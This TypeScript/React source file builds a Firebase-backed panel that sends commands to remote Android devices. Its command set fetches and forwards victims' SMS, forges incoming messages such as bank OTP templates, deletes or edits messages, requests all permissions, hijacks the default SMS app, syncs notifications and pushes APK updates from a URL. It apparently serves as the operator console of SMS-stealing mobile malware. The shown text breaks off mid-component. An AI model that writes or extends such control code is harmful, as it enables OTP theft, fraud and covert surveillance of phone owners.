import { useState, useEffect, useMemo, useCallback, memo } from 'react'
import { set } from 'firebase/database'
import {
  getDeviceCommandsPath,
  getDeviceCommandHistoryPath,
  getDevicePermissionStatusPath,
  type CommandHistoryEntry,
  type CommandHistoryGroup,
} from '@/lib/firebase-helpers'
import { Button } from '@/component/ui/button'
import { Input } from '@/component/ui/input'
import { Label } from '@/component/ui/label'
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from '@/component/ui/select'
import { Badge } from '@/component/ui/badge'
import {
  Send,
  Terminal,
  CheckCircle2,
  XCircle,
  Loader,
  History,
  ChevronDown,
  ChevronUp,
  Search,
  X,
} from 'lucide-react'
import { useToast } from '@/lib/use-toast'
import { onValue, off } from 'firebase/database'
import { AlertCircle } from 'lucide-react'
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from '@/component/ui/card'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/component/ui/tabs'
import WorkflowBuilder from './WorkflowBuilder'

interface RemoteCommandPanelProps {
  deviceId: string | null
  onCommandSent?: (command: string, deviceId: string) => void
}

interface CommandConfig {
  label: string
  description: string
  format: string
  category: string
  params: Array<{
    name: string
    label: string
    type: 'text' | 'number' | 'textarea' | 'select' | 'checkbox'
    required?: boolean
    default?: string | number | boolean
    placeholder?: string
    options?: string[]
    min?: number
    max?: number
  }>
  formatCommand: (params: Record<string, string | number | boolean | undefined>) => string
}

// All 29 commands with their configurations
const ALL_COMMANDS: Record<string, CommandConfig> = {
  // Core Operations
  sendSms: {
    label: 'Send SMS',
    description: 'Send SMS message immediately',
    format: 'phone:message or sim;phone:message',
    category: 'Core Operations',
    params: [
      { name: 'phone', label: 'Phone Number', type: 'text', required: true, placeholder: '+1234567890' },
      { name: 'message', label: 'Message', type: 'textarea', required: true, placeholder: 'Enter message text (max 160 chars)' },
      { name: 'sim', label: 'SIM Slot', type: 'select', default: '1', options: ['1', '2'], placeholder: '1' },
    ],
    formatCommand: (p) => {
      const sim = String(p.sim || '1')
      return sim !== '1' ? `${sim};${p.phone}:${p.message}` : `${p.phone}:${p.message}`
    },
  },
  sendSmsDelayed: {
    label: 'Send SMS Delayed',
    description: 'Send SMS message after a delay',
    format: 'phone:message:delayType:delayValue:sim',
    category: 'Core Operations',
    params: [
      { name: 'phone', label: 'Phone Number', type: 'text', required: true, placeholder: '+1234567890' },
      { name: 'message', label: 'Message', type: 'textarea', required: true, placeholder: 'Enter message text' },
      { name: 'delayType', label: 'Delay Type', type: 'select', required: true, options: ['seconds', 'minutes', 'hours', 'days', 'datetime'], default: 'minutes', placeholder: 'minutes' },
      { name: 'delayValue', label: 'Delay Value', type: 'text', required: true, placeholder: '5 (for minutes) or 2024-01-15T14:30:00 (for datetime)' },
      { name: 'sim', label: 'SIM Slot', type: 'select', default: '1', options: ['1', '2'], placeholder: '1' },
    ],
    formatCommand: (p) => `${p.phone}:${p.message}:${p.delayType}:${String(p.delayValue || '')}:${String(p.sim || '1')}`,
  },
  scheduleSms: {
    label: 'Schedule SMS',
    description: 'Schedule SMS message (one-time or recurring)',
    format: 'phone:message:scheduleType:scheduleValue:recurrence:sim',
    category: 'Core Operations',
    params: [
      { name: 'phone', label: 'Phone Number', type: 'text', required: true, placeholder: '+1234567890' },
      { name: 'message', label: 'Message', type: 'textarea', required: true, placeholder: 'Enter message text' },
      { name: 'scheduleType', label: 'Schedule Type', type: 'select', required: true, options: ['once', 'daily', 'weekly', 'monthly'], default: 'daily', placeholder: 'daily' },
      { name: 'scheduleValue', label: 'Schedule Value', type: 'text', required: true, placeholder: '09:00 (for daily) or 2024-01-15T14:30:00 (for once)' },
      { name: 'recurrence', label: 'Recurrence Count', type: 'number', required: true, default: 0, placeholder: '0 (infinite)', min: 0 },
      { name: 'sim', label: 'SIM Slot', type: 'select', default: '1', options: ['1', '2'], placeholder: '1' },
    ],
    formatCommand: (p) => `${p.phone}:${p.message}:${p.scheduleType}:${String(p.scheduleValue || '')}:${String(p.recurrence || 0)}:${String(p.sim || '1')}`,
  },
  editMessage: {
    label: 'Edit Message',
    description: 'Edit an existing SMS message',
    format: 'messageId:field:newValue',
    category: 'Core Operations',
    params: [
      { name: 'messageId', label: 'Message ID (timestamp)', type: 'text', required: true, placeholder: '1234567890123' },
      { name: 'field', label: 'Field to Edit', type: 'select', required: true, options: ['content', 'sender', 'timestamp', 'status'], default: 'content', placeholder: 'content' },
      { name: 'newValue', label: 'New Value', type: 'text', required: true, placeholder: 'New content or read/unread' },
    ],
    formatCommand: (p) => `${p.messageId}:${p.field}:${p.newValue}`,
  },
  deleteMessage: {
    label: 'Delete Message',
    description: 'Delete SMS message(s)',
    format: 'messageId or bulk:criteria',
    category: 'Core Operations',
    params: [
      { name: 'messageId', label: 'Message ID (for single delete)', type: 'text', required: false, placeholder: '1234567890123' },
      { name: 'bulkCriteria', label: 'Bulk Criteria (prefix with "bulk:")', type: 'text', required: false, placeholder: 'sender=+1234567890 or date=2024-01-15' },
    ],
    formatCommand: (p) => p.bulkCriteria ? `bulk:${String(p.bulkCriteria)}` : String(p.messageId || ''),
  },
  
  // Fake Messages
  createFakeMessage: {
    label: 'Create Fake Message',
    description: 'Create a fake SMS message',
    format: 'sender:message:timestamp:status:threadId',
    category: 'Fake Messages',
    params: [
      { name: 'sender', label: 'Sender Phone', type: 'text', required: true, placeholder: '+1234567890' },
      { name: 'message', label: 'Message', type: 'textarea', required: true, placeholder: 'Enter message text' },
      { name: 'timestamp', label: 'Timestamp', type: 'text', required: true, default: 'now', placeholder: 'now or 1234567890123' },
      { name: 'status', label: 'Status', type: 'select', required: true, options: ['received', 'sent', 'read', 'unread', 'delivered', 'failed'], default: 'received', placeholder: 'received' },
      { name: 'threadId', label: 'Thread ID (optional)', type: 'text', required: false, placeholder: '' },
    ],
    formatCommand: (p) => `${p.sender}:${p.message}:${String(p.timestamp || 'now')}:${p.status}:${String(p.threadId || '')}`,
  },
  createFakeMessageTemplate: {
    label: 'Create Fake Message from Template',
    description: 'Create fake message from template',
    format: 'templateId:sender:variables',
    category: 'Fake Messages',
    params: [
      { name: 'templateId', label: 'Template ID', type: 'text', required: true, placeholder: 'otp_bank' },
      { name: 'sender', label: 'Sender Phone', type: 'text', required: true, placeholder: '+1234567890' },
      { name: 'variables', label: 'Variables (key1=value1&key2=value2)', type: 'text', required: false, placeholder: 'code=123456' },
    ],
    formatCommand: (p) => `${p.templateId}:${p.sender}:${String(p.variables || '')}`,
  },
  
  // Automation
  setupAutoReply: {
    label: 'Setup Auto Reply',
    description: 'Configure auto-reply system',
    format: 'enabled:trigger:replyMessage:conditions',
    category: 'Automation',
    params: [
      { name: 'enabled', label: 'Enabled', type: 'select', required: true, options: ['true', 'false'], default: 'true', placeholder: 'true' },
      { name: 'trigger', label: 'Trigger Type', type: 'select', required: true, options: ['all', 'keyword', 'sender', 'time', 'template'], default: 'keyword', placeholder: 'keyword' },
      { name: 'replyMessage', label: 'Reply Message', type: 'textarea', required: true, placeholder: 'Auto reply message text' },
      { name: 'conditions', label: 'Conditions (key=value&key2=value2)', type: 'text', required: true, placeholder: 'keyword=help' },
    ],
    formatCommand: (p) => `${String(p.enabled)}:${p.trigger}:${p.replyMessage}:${String(p.conditions || '')}`,
  },
  forwardMessage: {
    label: 'Forward Message',
    description: 'Forward SMS message to another number',
    format: 'messageId:targetNumber:modify:newMessage',
    category: 'Automation',
    params: [
      { name: 'messageId', label: 'Message ID', type: 'text', required: true, placeholder: '1234567890123' },
      { name: 'targetNumber', label: 'Target Phone', type: 'text', required: true, placeholder: '+9876543210' },
      { name: 'modify', label: 'Modify Message', type: 'select', required: true, options: ['true', 'false'], default: 'false', placeholder: 'false' },
      { name: 'newMessage', label: 'New Message (if modify=true)', type: 'textarea', required: false, placeholder: 'Optional new message' },
    ],
    formatCommand: (p) => `${p.messageId}:${p.targetNumber}:${String(p.modify)}:${String(p.newMessage || '')}`,
  },
  
  // Bulk Operations
  sendBulkSms: {
    label: 'Send Bulk SMS',
    description: 'Send SMS to multiple recipients',
    format: 'recipients:message:personalize:delay:sim',
    category: 'Bulk Operations',
    params: [
      { name: 'recipients', label: 'Recipients (comma-separated)', type: 'textarea', required: true, placeholder: '+1234567890,+9876543210,+1112223333' },
      { name: 'message', label: 'Message (can use {name}, {phone} variables)', type: 'textarea', required: true, placeholder: 'Hello {name}' },
      { name: 'personalize', label: 'Personalize', type: 'select', required: true, options: ['true', 'false'], default: 'false', placeholder: 'false' },
      { name: 'delay', label: 'Delay (seconds between messages)', type: 'number', required: true, default: 2, placeholder: '2', min: 0, max: 3600 },
      { name: 'sim', label: 'SIM Slot', type: 'select', required: true, options: ['1', '2'], default: '1', placeholder: '1' },
    ],
    formatCommand: (p) => `${p.recipients}:${p.message}:${String(p.personalize)}:${String(p.delay || 2)}:${String(p.sim || '1')}`,
  },
  bulkEditMessage: {
    label: 'Bulk Edit Message',
    description: 'Edit multiple messages based on criteria',
    format: 'criteria:field:newValue',
    category: 'Bulk Operations',
    params: [
      { name: 'criteria', label: 'Criteria (sender:phone or date:YYYY-MM-DD)', type: 'text', required: true, placeholder: 'sender:+1234567890' },
      { name: 'field', label: 'Field to Edit', type: 'select', required: true, options: ['content', 'sender', 'timestamp', 'status'], default: 'status', placeholder: 'status' },
      { name: 'newValue', label: 'New Value', type: 'text', required: true, placeholder: 'read or unread' },
    ],
    formatCommand: (p) => `${p.criteria}:${p.field}:${p.newValue}`,
  },
  
  // Templates
  sendSmsTemplate: {
    label: 'Send SMS Template',
    description: 'Send SMS using a template',
    format: 'templateId:phone:variables',
    category: 'Templates',
    params: [
      { name: 'templateId', label: 'Template ID', type: 'text', required: true, placeholder: 'greeting' },
      { name: 'phone', label: 'Phone Number', type: 'text', required: true, placeholder: '+1234567890' },
      { name: 'variables', label: 'Variables (key1=value1&key2=value2)', type: 'text', required: false, placeholder: 'name=John&amount=100' },
    ],
    formatCommand: (p) => `${p.templateId}:${p.phone}:${String(p.variables || '')}`,
  },
  saveTemplate: {
    label: 'Save Template',
    description: 'Save a custom message template',
    format: 'templateId|content|category',
    category: 'Templates',
    params: [
      { name: 'templateId', label: 'Template ID', type: 'text', required: true, placeholder: 'custom_greeting' },
      { name: 'content', label: 'Template Content (can use {name}, {phone} variables)', type: 'textarea', required: true, placeholder: 'Hello {name}, your balance is {amount}' },
      { name: 'category', label: 'Category', type: 'text', required: false, default: 'custom', placeholder: 'custom' },
    ],
    formatCommand: (p) => `${p.templateId}|${p.content}|${String(p.category || 'custom')}`,
  },
  deleteTemplate: {
    label: 'Delete Template',
    description: 'Delete a custom message template',
    format: 'templateId',
    category: 'Templates',
    params: [
      { name: 'templateId', label: 'Template ID', type: 'text', required: true, placeholder: 'custom_greeting' },
    ],
    formatCommand: (p) => String(p.templateId || ''),
  },
  
  // Analytics & Backup
  getMessageStats: {
    label: 'Get Message Stats',
    description: 'Get message statistics',
    format: 'period',
    category: 'Analytics & Backup',
    params: [
      { name: 'period', label: 'Time Period', type: 'select', required: true, options: ['today', 'week', 'month', 'year', 'all'], default: 'week', placeholder: 'week' },
    ],
    formatCommand: (p) => String(p.period || 'all'),
  },
  backupMessages: {
    label: 'Backup Messages',
    description: 'Backup messages to Firebase or local storage',
    format: 'type:encrypt:format',
    category: 'Analytics & Backup',
    params: [
      { name: 'type', label: 'Backup Type', type: 'select', required: false, options: ['firebase', 'local'], default: 'firebase', placeholder: 'firebase' },
      { name: 'encrypt', label: 'Encrypt', type: 'select', required: false, options: ['true', 'false'], default: 'false', placeholder: 'false' },
      { name: 'format', label: 'Format', type: 'select', required: false, options: ['json', 'csv'], default: 'json', placeholder: 'json' },
    ],
    formatCommand: (p) => `${String(p.type || 'firebase')}:${String(p.encrypt || 'false')}:${String(p.format || 'json')}`,
  },
  exportMessages: {
    label: 'Export Messages',
    description: 'Export messages in various formats',
    format: 'format:criteria',
    category: 'Analytics & Backup',
    params: [
      { name: 'format', label: 'Format', type: 'select', required: true, options: ['json', 'csv'], default: 'json', placeholder: 'json' },
      { name: 'criteria', label: 'Criteria (optional)', type: 'text', required: false, placeholder: 'sender=+1234567890' },
    ],
    formatCommand: (p) => `${p.format}:${String(p.criteria || '')}`,
  },
  
  // Data Fetching
  fetchSms: {
    label: 'Fetch SMS',
    description: 'Fetch SMS messages from device',
    format: '{count}',
    category: 'Data Fetching',
    params: [
      { name: 'count', label: 'Message Count', type: 'select', required: false, options: ['10', '20', '30', '50', '100'], default: '20', placeholder: '20' },
    ],
    formatCommand: (p) => String(p.count || '20'),
  },
  fetchDeviceInfo: {
    label: 'Fetch Device Info',
    description: 'Fetch device information',
    format: '(empty)',
    category: 'Data Fetching',
    params: [],
    formatCommand: () => '',
  },
  
  // Notifications
  showNotification: {
    label: 'Show Notification',
    description: 'Display a notification on the device',
    format: 'title|message|priority|channel|action',
    category: 'Notifications',
    params: [
      { name: 'title', label: 'Title', type: 'text', required: true, placeholder: 'Alert' },
      { name: 'message', label: 'Message', type: 'textarea', required: true, placeholder: 'You have a new message' },
      { name: 'priority', label: 'Priority', type: 'select', required: false, options: ['min', 'low', 'default', 'high', 'max'], default: 'default', placeholder: 'default' },
      { name: 'channel', label: 'Channel', type: 'select', required: false, options: ['alerts', 'messages', 'instructions', 'emergency', 'system'], default: 'system', placeholder: 'system' },
      { name: 'action', label: 'Action (optional)', type: 'text', required: false, placeholder: '' },
    ],
    formatCommand: (p) => `showNotification|${p.title}|${p.message}|${p.channel || 'system'}|${p.priority || 'default'}|${p.action || ''}`,
  },
  syncNotification: {
    label: 'Sync Notification',
    description: 'Control notification sync mode',
    format: 'on | off | realtime:{minutes}',
    category: 'Notifications',
    params: [
      { name: 'mode', label: 'Sync Mode', type: 'select', required: true, options: ['on', 'off', 'realtime'], default: 'on', placeholder: 'on' },
      { name: 'minutes', label: 'Minutes (for realtime mode)', type: 'number', required: false, placeholder: '30', min: 1, max: 1440 },
    ],
    formatCommand: (p) => p.mode === 'realtime' ? `realtime:${String(p.minutes || 30)}` : String(p.mode || 'on'),
  },
  
  // Permissions
  requestPermission: {
    label: 'Request Permission',
    description: 'Request device permissions',
    format: 'ALL | permission1,permission2,...',
    category: 'Permissions',
    params: [
      { name: 'permissions', label: 'Permissions (comma-separated or ALL)', type: 'text', required: true, default: 'ALL', placeholder: 'ALL or sms,contacts,phone_state' },
    ],
    formatCommand: (p) => String(p.permissions || 'ALL'),
  },
  checkPermission: {
    label: 'Check Permission',
    description: 'Check current permission status',
    format: '(empty)',
    category: 'Permissions',
    params: [],
    formatCommand: () => '',
  },
  removePermission: {
    label: 'Remove Permission',
    description: 'Remove app from default SMS/Notification apps',
    format: 'defaultSmsApp | notificationListener',
    category: 'Permissions',
    params: [
      { name: 'type', label: 'Permission Type', type: 'select', required: true, options: ['defaultSmsApp', 'notificationListener'], default: 'defaultSmsApp', placeholder: 'defaultSmsApp' },
    ],
    formatCommand: (p) => String(p.type || 'defaultSmsApp'),
  },
  requestDefaultSmsApp: {
    label: 'Request Default SMS App',
    description: 'Request to set app as default SMS app',
    format: '(empty)',
    category: 'Permissions',
    params: [],
    formatCommand: () => '',
  },
  requestDefaultMessageApp: {
    label: 'Request Default Message App',
    description: 'Request to set app as default message app',
    format: '(empty)',
    category: 'Permissions',
    params: [],
    formatCommand: () => '',
  },
  
  // Device Control
  setHeartbeatInterval: {
    label: 'Set Heartbeat Interval',
    description: 'Set heartbeat interval for online status updates',
    format: '{seconds}',
    category: 'Device Control',
    params: [
      { name: 'interval', label: 'Interval (seconds)', type: 'number', required: true, default: 60, placeholder: '60', min: 10, max: 300 },
    ],
    formatCommand: (p) => String(p.interval || '60'),
  },
  updateDeviceCodeList: {
    label: 'Update Device Code List',
    description: 'Update device code list mapping',
    format: '{code}',
    category: 'Device Control',
    params: [
      { name: 'code', label: 'Device Activation Code', type: 'text', required: true, placeholder: 'ABC123' },
    ],
    formatCommand: (p) => String(p.code || ''),
  },
  reset: {
    label: 'Reset Device',
    description: 'Reset device (clear Firebase data and local setup)',
    format: '(empty)',
    category: 'Device Control',
    params: [],
    formatCommand: () => '',
  },
  updateApk: {
    label: 'Update APK',
    description: 'Trigger remote APK update',
    format: '{url} or {versionCode}|{url}',
    category: 'Device Control',
    params: [
      { name: 'versionCode', label: 'Version Code (optional)', type: 'text', required: false, placeholder: '123' },
      { name: 'url', label: 'APK Download URL', type: 'text', required: true, placeholder: 'https://example.com/app.apk' },
    ],
    formatCommand: (p) => p.versionCode ? `${p.versionCode}|${p.url}` : String(p.url || ''),
  },
  controlAnimation: {
    label: 'Control Animation',
    description: 'Control dashboard card animation',
    format: '{card}:{action} or stop:{card}',
    category: 'Device Control',
    params: [
      { name: 'action', label: 'Action Type', type: 'select', required: true, options: ['stop', 'start', 'toggle'], default: 'stop', placeholder: 'stop' },
      { name: 'card', label: 'Card Name', type: 'select', required: true, options: ['sms', 'instruction', 'status', 'phone', 'all'], default: 'sms', placeholder: 'sms' },
    ],
    formatCommand: (p) => {
      const action = String(p.action || 'stop')
      const card = String(p.card || 'sms')
      return action === 'stop' ? `stop:${card}` : `${card}:${action}`
    },
  },
}

// Group commands by category
const COMMANDS_BY_CATEGORY: Record<string, string[]> = {
  'Core Operations': ['sendSms', 'sendSmsDelayed', 'scheduleSms', 'editMessage', 'deleteMessage'],
  'Fake Messages': ['createFakeMessage', 'createFakeMessageTemplate'],
  'Automation': ['setupAutoReply', 'forwardMessage'],
  'Bulk Operations': ['sendBulkSms', 'bulkEditMessage'],
  'Templates': ['sendSmsTemplate', 'saveTemplate', 'deleteTemplate'],
  'Analytics & Backup': ['getMessageStats', 'backupMessages', 'exportMessages'],
  'Data Fetching': ['fetchSms', 'fetchDeviceInfo'],
  'Notifications': ['showNotification', 'syncNotification'],
  'Permissions': ['requestPermission', 'checkPermission', 'removePermission', 'requestDefaultSmsApp', 'requestDefaultMessageApp'],
  'Device Control': ['setHeartbeatInterval', 'updateDeviceCodeList', 'reset', 'updateApk', 'controlAnimation'],
  'Workflows': ['executeWorkflow'],
}

export default function RemoteCommandPanel({ deviceId, onCommandSent }: RemoteCommandPanelProps) {
  const { toast } = useToast()
  const [commandParams, setCommandParams] = useState<Record<string, Record<string, string | number | boolean>>>({})
  const [loadingCommands, setLoadingCommands] = useState<Record<string, boolean>>({})
  const [firebaseHistory, setFirebaseHistory] = useState<CommandHistoryEntry[]>([])
  const [showPersistentHistory, setShowPersistentHistory] = useState(false)
  const [expandedCategories, setExpandedCategories] = useState<Record<string, boolean>>({})
  const [searchQuery, setSearchQuery] = useState('')
  const [defaultSmsAppStatus, setDefaultSmsAppStatus] = useState<boolean | null>(null)

  // Memoized Command Row Component for performance
  const CommandRow = memo(({ 
    commandKey, 
    config, 
    params, 
    loading, 
    onParamChange, 
    onSend 
  }: { 
    commandKey: string
    config: CommandConfig
    params: Record<string, string | number | boolean>
    loading: boolean
    onParamChange: (key: string, paramName: string, value: string | number | boolean) => void
    onSend: (key: string) => void
  }) => {
    return (
      <div className="flex items-center gap-3 p-3 rounded-lg border bg-card hover:bg-muted/50 transition-colors">
        {/* Command Label */}
        <div className="flex-shrink-0 w-48">
          <div className="font-medium text-sm">{config.label}</div>
          <div className="text-xs text-muted-foreground truncate" title={config.description}>
            {config.description}
          </div>
        </div>

        {/* Input Fields */}
        <div className="flex-1 flex items-center gap-2 flex-wrap">
          {config.params.length > 0 ? (
            config.params.map(param => (
              <div key={param.name} className="flex items-center gap-1 min-w-[120px]">
                <Label className="text-xs whitespace-nowrap min-w-[60px]">
                  {param.label}
                  {param.required && <span className="text-red-500 ml-0.5">*</span>}
                </Label>
                <div className="flex-1 min-w-[100px]">
                  {param.type === 'textarea' ? (
                    <Input
                      type="text"
                      value={String(params[param.name] ?? param.default ?? '')}
                      onChange={e => onParamChange(commandKey, param.name, e.target.value)}
                      required={param.required}
                      placeholder={param.placeholder}
                      className="h-8 text-xs"
                    />
                  ) : param.type === 'select' ? (
                    <Select
                      value={String(params[param.name] ?? param.default ?? '')}
                      onValueChange={v => onParamChange(commandKey, param.name, v)}
                    >
                      <SelectTrigger className="h-8 text-xs">
                        <SelectValue placeholder={param.placeholder} />
                      </SelectTrigger>
                      <SelectContent>
                        {param.options?.map(opt => (
                          <SelectItem key={opt} value={opt}>
                            {opt}
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  ) : param.type === 'number' ? (
                    <Input
                      type="number"
                      value={String(params[param.name] ?? param.default ?? '')}
                      onChange={e => onParamChange(commandKey, param.name, e.target.value)}
                      required={param.required}
                      placeholder={param.placeholder}
                      min={param.min}
                      max={param.max}
                      className="h-8 text-xs"
                    />
                  ) : (
                    <Input
                      type="text"
                      value={String(params[param.name] ?? param.default ?? '')}
                      onChange={e => onParamChange(commandKey, param.name, e.target.value)}
                      required={param.required}
                      placeholder={param.placeholder}
                      className="h-8 text-xs"
                    />
                  )}
                </div>
              </div>
            ))
          ) : (
            <div className="text-xs text-muted-foreground italic">No parameters</div>
          )}
        </div>

        {/* Send Button */}
        <div className="flex-shrink-0">
          <Button
            onClick={() => onSend(commandKey)}
            disabled={loading}
            size="sm"
            className="h-8"
          >
            {loading ? (
              <>
                <Loader className="h-3 w-3 mr-1 animate-spin" />
                Sending
              </>
            ) : (
              <>
                <Send className="h-3 w-3 mr-1" />
                Send
              </>
            )}
          </Button>
        </div>
      </div>
    )
  })
  CommandRow.displayName = 'CommandRow'

  // Initialize default values for all commands
  useEffect(() => {
    const defaults: Record<string, Record<string, string | number | boolean>> = {}
    Object.keys(ALL_COMMANDS).forEach(key => {
      const config = ALL_COMMANDS[key]
      const params: Record<string, string | number | boolean> = {}
      config.params.forEach(param => {
        if (param.default !== undefined) {
          params[param.name] = param.default
        }
      })
      defaults[key] = params
    })
    setCommandParams(defaults)
    
    // Expand first category by default
    const firstCategory = Object.keys(COMMANDS_BY_CATEGORY)[0]
    setExpandedCategories({ [firstCategory]: true })
  }, [])

  // Load persistent command history from Firebase
  useEffect(() => {
    if (!deviceId) {
      setFirebaseHistory([])
      return
    }

    const historyRef = getDeviceCommandHistoryPath(deviceId)
    const unsubscribe = onValue(
      historyRef,
      snapshot => {
        if (snapshot.exists()) {
          const historyData = snapshot.val() as CommandHistoryGroup
          const entries: CommandHistoryEntry[] = []

          Object.keys(historyData).forEach(timestamp => {
            const timestampGroup = historyData[timestamp]
            if (timestampGroup && typeof timestampGroup === 'object') {
              Object.keys(timestampGroup).forEach(commandKey => {
                const entry = timestampGroup[commandKey]
                if (entry && typeof entry === 'object' && entry.deviceId === deviceId) {
                  entries.push(entry as CommandHistoryEntry)
                }
              })
            }
          })

          entries.sort((a, b) => b.timestamp - a.timestamp)
          setFirebaseHistory(entries)
        } else {
          setFirebaseHistory([])
        }
      },
      error => {
        console.error(`Error loading command history:`, error)
      }
    )

    return () => {
      off(historyRef, 'value', unsubscribe)
    }
  }, [deviceId])

  // Fetch default SMS app status
  useEffect(() => {
    if (!deviceId) {
      setDefaultSmsAppStatus(null)
      return
    }

    const permissionStatusRef = getDevicePermissionStatusPath(deviceId)
    
    const unsubscribe = onValue(
      permissionStatusRef,
      (snapshot) => {
        if (!snapshot.exists()) {
          setDefaultSmsAppStatus(null)
          return
        }

        // Get the latest timestamp entry
        const entries: Array<{ timestamp: number; data: { defaultSmsApp?: { isDefault: boolean } } }> = []
        snapshot.forEach((child) => {
          entries.push({
            timestamp: parseInt(child.key || '0'),
            data: child.val(),
          })
          return false
        })

        if (entries.length === 0) {
          setDefaultSmsAppStatus(null)
          return
        }

        // Sort by timestamp descending and get the latest
        entries.sort((a, b) => b.timestamp - a.timestamp)
        const latest = entries[0].data

        if (latest.defaultSmsApp) {
          setDefaultSmsAppStatus(latest.defaultSmsApp.isDefault === true)
        } else {
          setDefaultSmsAppStatus(null)
        }
      },
      (error) => {
        console.error('Error listening to permission status:', error)
      }
    )

    return () => {
      off(permissionStatusRef, 'value', unsubscribe)
    }
  }, [deviceId])

  // Commands that require default SMS app
  const commandsRequiringDefaultSmsApp = ['editMessage', 'deleteMessage', 'bulkEditMessage', 'createFakeMessage']

  const handleParamChange = useCallback((commandKey: string, paramName: string, value: string | number | boolean) => {
    setCommandParams(prev => ({
      ...prev,
      [commandKey]: {
        ...prev[commandKey],
        [paramName]: value,
      },
    }))
  }, [])

  const sendCommand = useCallback(async (commandKey: string, customParams?: Record<string, string | number | boolean>) => {
    if (!deviceId) {
      toast({
        title: 'Error',
        description: 'Please select a device',
        variant: 'destructive',
      })
      return
    }

    const config = ALL_COMMANDS[commandKey]
    if (!config) return

    // Validate required params
    const params = customParams ?? commandParams[commandKey] ?? {}
    for (const param of config.params) {
      if (param.required) {
        const value = params[param.name]
        if (value === undefined || value === null || value === '') {
          toast({
            title: 'Validation Error',
            description: `${param.label} is required`,
            variant: 'warning',
          })
          return
        }
      }
    }

    setLoadingCommands(prev => ({ ...prev, [commandKey]: true }))

    try {
      const commandValue = config.formatCommand(params)
      const commandRef = getDeviceCommandsPath(deviceId, commandKey)

      await set(commandRef, commandValue)

      if (onCommandSent) {
        onCommandSent(commandKey, deviceId)
      }

      toast({
        title: 'Command Sent',
        description: `Successfully sent ${config.label}`,
        variant: 'success',
      })
    } catch (error) {
      console.error('Error sending command:', error)
      const errorMessage = error instanceof Error ? error.message : 'Failed to send command'
      toast({
        title: 'Command Failed',
        description: errorMessage,
        variant: 'destructive',
      })
    } finally {
      setLoadingCommands(prev => ({ ...prev, [commandKey]: false }))
    }
  }, [deviceId, commandParams, onCommandSent, toast])

  const toggleCategory = useCallback((category: string) => {
    setExpandedCategories(prev => ({
      ...prev,
      [category]: !prev[category],
    }))
  }, [])

  // Filter commands based on search query
  const filteredCommandsByCategory = useMemo(() => {
    if (!searchQuery.trim()) {
      return COMMANDS_BY_CATEGORY
    }

    const query = searchQuery.toLowerCase().trim()
    const filtered: Record<string, string[]> = {}

    Object.entries(COMMANDS_BY_CATEGORY).forEach(([category, commandKeys]) => {
      const matchingCommands = commandKeys.filter(commandKey => {
        const config = ALL_COMMANDS[commandKey]
        if (!config) return false
        
        // Search in label, description, and format
        const searchableText = [
          config.label,
          config.description,
          config.format,
          commandKey,
          category,
        ].join(' ').toLowerCase()

        return searchableText.includes(query)
      })

      if (matchingCommands.length > 0) {
        filtered[category] = matchingCommands
      }
    })

    return filtered
  }, [searchQuery])

  // Auto-expand categories that have matching results
  useEffect(() => {
    if (searchQuery.trim()) {
      const categoriesToExpand: Record<string, boolean> = {}
      Object.keys(filteredCommandsByCategory).forEach(category => {
        categoriesToExpand[category] = true
      })
      setExpandedCategories(categoriesToExpand)
    }
  }, [filteredCommandsByCategory, searchQuery])

  if (!deviceId) {
    return (
      <div className="space-y-4">
        <div className="flex items-center gap-2">
          <Terminal className="h-5 w-5" />
          <h2 className="text-2xl font-bold">Remote Commands</h2>
        </div>
        <div className="rounded-lg border p-4 text-center text-muted-foreground">
          Please select a device to send commands
        </div>
      </div>
    )
  }

  return (
    <div className="space-y-4">
      <div className="flex items-center justify-between gap-4">
        <div className="flex items-center gap-2">
          <Terminal className="h-5 w-5" />
          <h2 className="text-2xl font-bold">Remote Commands</h2>
          <Badge variant="outline">
            {searchQuery.trim() 
              ? `${Object.values(filteredCommandsByCategory).flat().length} of ${Object.keys(ALL_COMMANDS).length}` 
              : Object.keys(ALL_COMMANDS).length} Commands
          </Badge>
        </div>
        <div className="flex items-center gap-2">
          {/* Search Input */}
          <div className="relative w-64">
            <Search className="absolute left-2 top-1/2 transform -translate-y-1/2 h-4 w-4 text-muted-foreground" />
            <Input
              type="text"
              placeholder="Search commands..."
              value={searchQuery}
              onChange={e => setSearchQuery(e.target.value)}
              className="pl-8 pr-8 h-9"
            />
            {searchQuery && (
              <Button
                variant="ghost"
                size="sm"
                className="absolute right-1 top-1/2 transform -translate-y-1/2 h-6 w-6 p-0"
                onClick={() => setSearchQuery('')}
              >
                <X className="h-3 w-3" />
              </Button>
            )}
          </div>
          <Button
            variant={showPersistentHistory ? 'default' : 'outline'}
            onClick={() => setShowPersistentHistory(!showPersistentHistory)}
          >
            <History className="h-4 w-4 mr-2" />
            {showPersistentHistory ? 'Hide' : 'Show'} History
          </Button>
        </div>
      </div>

      {deviceId && (
        <div className="rounded-lg border p-4">
          <div className="text-sm text-muted-foreground mb-2">
            Target Device: <Badge variant="outline">{deviceId.substring(0, 12)}...</Badge>
          </div>
        </div>
      )}

      {/* Workflow Builder Tab */}
      <Tabs defaultValue="commands" className="w-full">
        <TabsList className="grid w-full grid-cols-2">
          <TabsTrigger value="commands">Commands ({Object.keys(ALL_COMMANDS).length})</TabsTrigger>
          <TabsTrigger value="workflows">Workflow Builder</TabsTrigger>
        </TabsList>
        
        <TabsContent value="commands" className="space-y-4 mt-4">
          {/* Persistent Command History */}
      {showPersistentHistory && (
        <Card>
          <CardHeader>
            <CardTitle>Persistent Command History</CardTitle>
            <CardDescription>{firebaseHistory.length} entries</CardDescription>
          </CardHeader>
          <CardContent>
            {firebaseHistory.length === 0 ? (
              <div className="text-center text-muted-foreground py-8">
                No command history found
              </div>
            ) : (
              <div className="space-y-2 max-h-96 overflow-y-auto">
                {firebaseHistory.slice(0, 50).map((entry, index) => (
                  <div
                    key={`${entry.timestamp}-${entry.command}-${index}`}
                    className="flex items-start justify-between p-3 rounded border text-sm"
                  >
                    <div className="flex-1">
                      <div className="flex items-center gap-2 mb-1">
                        <span className="font-medium">
                          {ALL_COMMANDS[entry.command]?.label || entry.command}
                        </span>
                        {entry.status === 'executed' && (
                          <Badge variant="default" className="bg-green-500">
                            <CheckCircle2 className="h-3 w-3 mr-1" />
                            Executed
                          </Badge>
                        )}
                        {entry.status === 'failed' && (
                          <Badge variant="destructive">
                            <XCircle className="h-3 w-3 mr-1" />
